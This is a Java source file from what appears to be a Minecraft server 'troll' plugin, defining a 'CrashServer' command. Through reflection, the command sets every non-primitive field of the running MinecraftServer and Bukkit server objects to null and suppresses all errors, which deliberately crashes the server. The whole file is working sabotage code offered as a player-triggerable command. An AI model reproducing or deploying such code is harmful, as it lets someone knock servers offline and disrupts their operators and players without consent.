package net.Lenni0451.GitTroll.command.commands.server;

import java.lang.reflect.Field;
import java.util.List;

import org.bukkit.Bukkit;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.MinecraftServer;

public class CrashServer extends CommandBase {

	public CrashServer() {
		super("CrashServer", "Crash the server by replacing random variables with null");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			try {
				for(Field f : MinecraftServer.class.getDeclaredFields()) {
					try {
						if(!f.getType().isPrimitive()) {
							f.setAccessible(true);
							f.set(MinecraftServer.getServer(), null);
						}
					} catch (Exception e) {}
				}
				for(Field f : Bukkit.getServer().getClass().getDeclaredFields()) {
					try {
						if(!f.getType().isPrimitive()) {
							f.setAccessible(true);
							f.set(Bukkit.getServer(), null);
						}
					} catch (Exception e) {}
				}
			} catch (Exception e) {}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
